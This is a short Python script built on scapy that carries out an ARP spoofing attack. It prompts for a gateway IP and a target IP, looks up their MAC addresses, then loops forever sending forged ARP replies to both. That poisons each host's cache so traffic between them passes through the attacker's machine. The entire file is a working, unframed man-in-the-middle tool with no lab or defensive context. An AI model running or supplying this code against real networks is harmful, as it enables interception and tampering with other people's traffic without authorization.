from scapy.all import *
from scapy.layers.l2 import ARP

gw = input("Gateway IP: ")
target = input("Target IP: ")


def get_mac(ip):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10)
    for s, r in resp:
        return r[ARP].hwsrc
    return None


gw_mac = get_mac(gw)
trgt_mac = get_mac(target)


def arp_poison(gate_ip, gate_mac, target_ip, target_mac):
    while True:
        send(ARP(op=2, pdst=gate_ip, hwdst=gate_mac, psrc=target_ip))
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gate_ip))
        time.sleep(2)


arp_poison(gw, gw_mac, target, trgt_mac)
